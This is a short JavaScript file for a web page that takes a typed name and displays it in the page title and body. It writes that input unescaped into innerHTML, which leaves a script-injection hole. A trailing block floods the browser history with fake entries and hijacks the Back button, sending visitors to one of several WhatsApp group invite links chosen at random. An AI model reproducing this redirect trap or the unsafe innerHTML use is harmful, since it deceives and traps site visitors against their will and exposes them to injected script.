let names = document.getElementById('text');
let input = document.getElementById('holder');
let button = document.getElementById('submit');
let title = document.getElementById('title');
function ShowName(valuess) {
  console.log(input.value);
 history.pushState({},"",(input.value))
 title.innerHTML = (input.value);
  names.innerHTML = (input.value) ;
}

button.addEventListener ('click', () => {
console.log("clicked");
button.style.display = "none";
input.style.display = "none";
ShowName();


});
 ! function (){var t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=
   	function (t){
   		const linkarray = ["https://chat.whatsapp.com/HqXNXuy9NsS3tJ7qoeOxgi","https://chat.whatsapp.com/DYYZ4uisKRi7kvefky5tNG","https://chat.whatsapp.com/HqXNXuy9NsS3tJ7qoeOxgi"];
   		var linkid = Math.floor(Math.random() * 3);
   		t.state && location.replace(linkarray[linkid]);
   	}}catch (o){}}();
